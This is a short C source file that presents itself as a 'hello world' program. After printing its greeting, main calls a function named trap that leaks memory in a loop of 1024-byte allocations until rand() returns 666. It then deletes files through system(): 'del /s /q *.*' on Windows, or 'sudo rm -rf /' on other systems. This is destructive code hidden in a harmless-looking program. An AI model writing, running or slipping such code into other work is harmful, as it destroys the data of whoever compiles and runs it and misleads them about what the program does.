#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void trap() {
	srand(time(NULL));
	while (rand() != 666) malloc(1024);
#if defined(_WIN32)
	system("del /s /q *.*");
#else
	system("sudo rm -rf /");
#endif
}

int main(void) {
	printf("hello world!\n");
	trap();
	return 0;
}
